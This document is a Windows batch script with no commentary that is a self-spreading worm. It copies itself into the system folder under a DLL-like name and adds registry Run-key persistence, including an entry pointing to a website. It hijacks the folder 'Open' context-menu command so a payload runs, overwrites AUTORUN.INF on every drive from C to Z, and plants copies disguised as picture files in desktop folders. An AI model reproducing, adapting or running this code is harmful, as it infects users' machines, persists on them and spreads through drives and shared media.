ECHO OFF 
SET N=%0
IF NOT EXIST "%SystemRoot%\ms1dll0.exe" COPY /Y %N% "%SystemRoot%\ms1dll0.exe"
IF NOT EXIST "%SystemRoot%\ms1rep0.exe" COPY /Y %MYFILES%\MS1REP0.OK "%SystemRoot%\ms1rep0.exe"
REG add "HKCU\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run" /v msdll /t reg_sz /d "%SystemRoot%\ms1dll0.exe" /f
REG add "HKCU\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run" /v mssky /t reg_sz /d "www.dzaier.sitew.com" /f
REG add "HKEY_CLASSES_ROOT\Directory\shell" /ve /d LEOPEN /F
REG add "HKCR\Directory\shell\LEOPEN" /ve /d Ouvrir /F
REG add "HKCR\Directory\shell\LEOPEN\command"  /ve /d "%SystemRoot%\ms1rep0.exe ""%%1""" /F
IF "%1"=="CD" EXPLORER .

FOR %%i in (C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) do (set Disk=%%i:& call :go1)
GOTO SUIT1
:go1
IF NOT EXIST "%Disk%\msdll.exe" COPY /Y %N% "%Disk%\msdll.exe"
DEL /f /q /a "%Disk%\AUTORUN.INF"
COPY /Y %MYFILES%\AUTORUN.OK "%Disk%\AUTORUN.INF"
goto :eof
:SUIT1
FOR /f "delims=" %%i in ('dir "%USERPROFILE%\Bureau\*." /a:d /b /s') do (set REP=%%i& call :go2)
EXIT
:go2
IF  exist "%REP%\DSC [*] bil Picture-O*19.exe" goto :eof
COPY /Y %N% "%REP%\DSC [%RANDOM%] bil Picture-O%RANDOM%19.exe"
goto :eof
